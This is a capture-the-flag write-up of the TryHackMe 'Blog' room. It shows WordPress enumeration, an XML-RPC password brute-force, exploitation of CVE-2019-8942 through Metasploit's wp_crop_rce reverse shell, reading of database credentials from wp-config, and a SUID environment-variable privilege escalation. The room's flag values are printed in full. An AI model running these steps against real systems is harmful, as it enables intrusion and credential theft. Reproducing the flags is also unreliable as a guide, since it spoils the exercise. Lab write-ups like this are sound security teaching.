---
title: "Blog — TryHackMe Write-up"
date: 2026-08-23 12:00:00 +0530
categories: [TryHackMe]
tags: [wordpress, cve-2019-8942, privesc, suid]
---

## Introduction

The **Blog** room on TryHackMe is a medium-difficulty machine themed around a WordPress blog run by "Billy Joel." Beneath the casual surface, the machine hides a real CVE — **CVE-2019-8942**, a WordPress image crop Remote Code Execution vulnerability — paired with an unconventional custom binary for privilege escalation that'll make you think twice before assuming an exploit needs complex reverse engineering.

Your goals:

- Find user.txt (not where you expect it)
- Find root.txt
- Answer three bonus questions about the machine

There's also a deliberate **rabbit hole** built into this room — a clue about a company called "Rubber Ducky Inc." that hints at where the real user.txt is hiding. More on that later.

## Setup — /etc/hosts

Before anything else, the room requires you to add an entry to your hosts file. Without this, the WordPress site won't load correctly due to how it handles virtual hosting on AWS.

```bash
echo "<TARGET_IP> blog.thm" | sudo tee -a /etc/hosts
```

Verify it works:

```bash
curl -s http://blog.thm | head -20
```

## Phase 1 — Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 -oN nmap_scan.txt <TARGET_IP>
```

**Results:**

```
PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 7.6p1 Ubuntu
80/tcp  open  http          Apache httpd 2.4.29
139/tcp open  netbios-ssn   Samba smbd 3.X - 4.X
445/tcp open  microsoft-ds  Samba smbd 4.7.6-Ubuntu
```

Four open ports: SSH (22), HTTP (80), and two SMB ports (139, 445). The SMB shares are interesting — let's note them for later. The web server on port 80 is our primary entry point.

The nmap script output also reveals something valuable right away:

```
| http-generator: WordPress 5.0
```

WordPress 5.0. That version number will be very significant shortly.

## Phase 2 — SMB Enumeration (The Rabbit Hole)

With SMB open, let's enumerate it. This is where the room tries to send you down a rabbit hole — and it's worth walking through so you understand *why* it's a dead end.

```bash
smbclient -L //<TARGET_IP>/ -N
```

There's a share called BillySMB. Connect to it:

```bash
smbclient //<TARGET_IP>/BillySMB -N
smb: \> ls
smb: \> get Alice-White-Rabbit.jpg
smb: \> get tswift.jpg
smb: \> get check-this.png
```

Checking these files for hidden data (steganography):

```bash
steghide extract -sf Alice-White-Rabbit.jpg
strings check-this.png
exiftool tswift.jpg
```

You'll find a .txt file embedded in the Alice image, but it contains nothing useful for exploitation. The "Rubber Ducky Inc." reference in the room description is actually a hint pointing at /media/usb — but that's for after we get root.

**Verdict: SMB is a rabbit hole. Move on.**

## Phase 3 — WordPress Enumeration

Visit http://blog.thm in your browser. It's a simple WordPress blog — a few posts, a comment section, nothing remarkable on the surface.

### WPScan — Full Enumeration

```bash
wpscan --url http://blog.thm --enumerate ap,at,u --detection-mode aggressive
```

**Flag breakdown:**

- `--enumerate ap` — All Plugins
- `--enumerate at` — All Themes
- `--enumerate u` — Users
- `--detection-mode aggressive` — More thorough (generates noise, but we're in a lab)

**Key findings:**

```
[+] WordPress version: 5.0 (Insecure, released on 2018-12-06)
[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php

[i] User(s) Identified:
[+] kwheel
[+] bjoel
[+] Karen Wheeler
[+] Billy Joel
```

Two important takeaways:

1. WordPress 5.0 is running — this is vulnerable to CVE-2019-8942
2. We have usernames: kwheel and bjoel

You can also enumerate users via the WordPress REST API without WPScan:

```
http://blog.thm/wp-json/wp/v2/users
```

This returns a JSON response listing all registered users — another common WordPress misconfiguration.

## Phase 4 — Credential Brute-Force

We have usernames but no passwords. WPScan can brute-force via the XML-RPC interface, which is faster than attacking the login form directly.

```bash
wpscan --url http://blog.thm \
  -U kwheel,bjoel \
  -P /usr/share/wordlists/rockyou.txt \
  -t 50
```

- `-U` — Username list
- `-P` — Password wordlist
- `-t 50` — 50 threads for speed

**Result:**

```
[SUCCESS] - kwheel / cutiepie1
```

**Credentials found:** `kwheel:cutiepie1`

Note that bjoel (Billy Joel himself) doesn't have a crackable password in rockyou — the machine intentionally made kwheel (Karen Wheeler) the weak link.

## Phase 5 — Exploitation: CVE-2019-8942 (WordPress Crop-Image RCE)

### Understanding the Vulnerability

**CVE-2019-8942** affects WordPress 5.0.0 and earlier. Here's how it works conceptually:

When WordPress manages uploaded images, it stores file references in the database as "Post Meta" entries. When cropping an image, WordPress constructs a path from this meta entry — but it doesn't sanitize the value properly. An attacker with author-level (or higher) access can manipulate this path to point to a PHP file they control, effectively uploading a webshell.

The vulnerability was discovered by RIPSTECH and patched in WordPress 5.0.1. Our target is running 5.0.0 — right in the vulnerable range.

**References:**

- [ExploitDB #46662](https://www.exploit-db.com/exploits/46662) — Metasploit module
- [ExploitDB #49512](https://www.exploit-db.com/exploits/49512) — Python manual exploit

### Exploitation with Metasploit

```bash
msfconsole

msf6 > use exploit/multi/http/wp_crop_rce
msf6 exploit(wp_crop_rce) > show options
```

Set the required options:

```bash
set RHOSTS <TARGET_IP>
set LHOST <YOUR_VPN_IP>   # Your tun0 IP, NOT wlan0
set LPORT 4444
set USERNAME kwheel
set PASSWORD cutiepie1
set TARGETURI /
run
```

**Important:** LHOST must be your TryHackMe VPN IP (tun0), not your local network IP. Run `ip a show tun0` to confirm.

After a moment:

```
[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[*] Executing the payload
[+] Deleted malicious post
[+] Deleted malicious attachment
[*] Sending stage (39282 bytes) to <TARGET_IP>
[+] Meterpreter session 1 opened
```

We have a Meterpreter session as www-data.

### Upgrading to a Full Shell

From Meterpreter, drop into a system shell and stabilize it:

```bash
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z, then: stty raw -echo; fg
```

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Phase 6 — Post-Exploitation & Flag Hunting

### The Rabbit Hole — /home/bjoel

```bash
cd /home
ls
# bjoel

cd bjoel
ls -la
# -rw-r--r-- 1 bjoel bjoel 57 ... user.txt
# -rw-r--r-- 1 bjoel bjoel ... Billy_Joel_Termination_May20-2020.pdf
```

Read user.txt:

```bash
cat user.txt
# You won't find what you're looking for here.
# TRY HARDER
```

Classic CTF misdirection. The user.txt here is intentionally fake. The PDF is also a lore piece: Billy Joel was "terminated" by **Rubber Ducky Inc.** — remember that company name. It's a hint.

The real user.txt is mounted somewhere else. We'll find it after getting root.

### wp-config.php — Database Credentials

While exploring, check the WordPress config:

```bash
cat /var/www/wordpress/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD"
```

This reveals database credentials. You can log into MySQL and inspect the wp_users table:

```bash
mysql -u wordpress -p wordpress
SELECT user_login, user_pass FROM wp_users;
```

You'll find two password hashes. These are bcrypt-hashed and won't crack easily — they're another dead end.

## Phase 7 — Privilege Escalation: The `checker` Binary

### Finding SUID Files

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the standard SUID binaries, one stands out:

```
/usr/sbin/checker
```

This is not a standard Linux binary — it's custom-built for this machine. Owned by root, SUID set. Let's investigate.

### Running the Binary

```bash
/usr/sbin/checker
# Not an Admin
```

It outputs "Not an Admin" and exits. But *how* does it decide we're not an admin?

### Analyzing with ltrace

ltrace intercepts and displays library calls made by a program as it runs — perfect for understanding what a binary is checking without needing to decompile it.

```bash
ltrace /usr/sbin/checker
```

**Output:**

```
getenv("admin") = nil
puts("Not an Admin") = 13
+++ exited (status 0) +++
```

That's all we needed to know. The binary calls `getenv("admin")` — it checks for an environment variable named `admin`. If it's nil (not set), it prints "Not an Admin" and exits. The check is purely existence-based; **the value doesn't matter**.

### Deeper Understanding — Ghidra (Optional)

For the curious, the binary's decompiled C logic in Ghidra looks approximately like this:

```c
int main() {
    char *admin = getenv("admin");
    if (admin == NULL) {
        puts("Not an Admin");
        exit(0);
    }
    setuid(0);            // Set UID to root
    system("/bin/bash");  // Drop into bash as root
}
```

Because the binary has the SUID bit set and is owned by root, when `setuid(0)` is called, it escalates our process to run as root. All we need to do is make sure the `admin` environment variable exists.

### Exploiting the Binary

```bash
export admin=1
/usr/sbin/checker
```

**Result:**

```
root@blog:/home/bjoel# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

We are root.

### Capturing root.txt

```bash
cat /root/root.txt
```

🚩 **root.txt:** `9a0b2b618bef9bfa7ac28c1353d9f318`

## Phase 8 — Finding the Real user.txt

Remember "Rubber Ducky Inc."? The USB reference in Billy's termination letter was pointing us here:

```bash
find / -name "user.txt" 2>/dev/null
```

**Output:**

```
/home/bjoel/user.txt   ← the fake one
/media/usb/user.txt    ← the real one
```

```bash
cat /media/usb/user.txt
```

🚩 **user.txt:** `c8421899aae571f7af486492b71a8ab7`

The USB mount at /media/usb was inaccessible to www-data, which is why we couldn't read it before gaining root. The "Rubber Ducky" and "Termination" story in the PDF was the in-lore hint that a USB drive was involved.

## Room Questions — Answered

| Question | Answer |
|---|---|
| What CMS was Billy using? | WordPress |
| What version of the above CMS was being used? | 5.0 |
| Where was user.txt found? | /media/usb |

## Attack Chain Summary

```
Nmap → 4 ports: SSH, HTTP (WordPress 5.0), SMB
  ↓
SMB enumeration → BillySMB share → rabbit hole (steganography, no useful data)
  ↓
WPScan enumeration → users: kwheel, bjoel
  ↓
WPScan brute-force via XML-RPC → kwheel:cutiepie1
  ↓
CVE-2019-8942 (wp_crop_rce) → Meterpreter shell as www-data
  ↓
/home/bjoel/user.txt → fake flag ("TRY HARDER")
PDF hint → "Rubber Ducky Inc." → points to /media/usb
  ↓
SUID enumeration → /usr/sbin/checker
ltrace → getenv("admin") == nil check
export admin=1 && /usr/sbin/checker → root shell
  ↓
root.txt captured from /root/
user.txt captured from /media/usb/
```

## Lessons Learned

1. **Read the lore.** The PDF found in Billy's home directory wasn't just flavor text — "Rubber Ducky Inc." was the hint pointing at the USB mount. CTF designers embed clues everywhere.
2. **Don't trust the obvious user.txt.** This room deliberately placed a fake flag to frustrate anyone who found it and thought they were done. Always verify your flags match the expected format.
3. **ltrace is underrated.** You don't always need Ghidra or a full decompilation to understand a binary. ltrace showed us the exact library call being made in one line. Use it before reaching for heavier tools.
4. **XML-RPC is a wide-open door.** WordPress's XML-RPC interface (/xmlrpc.php) allows unlimited login attempts by default — no lockout, no CAPTCHA. This makes it a far more efficient brute-force target than the login form itself.
5. **Environment variables as authentication is broken.** The checker binary's logic is fundamentally flawed: checking for the *existence* of an environment variable (with no signature, no value check, no privilege validation) is not security — it's theater. Any code running in that shell could set the variable.
6. **WordPress 5.0.0 is ancient — patch your CMS.** CVE-2019-8942 was disclosed in February 2019 and patched immediately in 5.0.1. Running unpatched CMS versions is one of the most common real-world attack vectors.

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning & service fingerprinting |
| smbclient | SMB share enumeration |
| WPScan | WordPress enumeration & credential brute-force |
| Metasploit (wp_crop_rce) | CVE-2019-8942 exploitation |
| ltrace | Dynamic binary analysis |
| Ghidra | Static binary reverse engineering (optional) |
| find | SUID file discovery & flag hunting |

## Flags

| Flag | Value |
|---|---|
| user.txt | `c8421899aae571f7af486492b71a8ab7` |
| root.txt | `9a0b2b618bef9bfa7ac28c1353d9f318` |
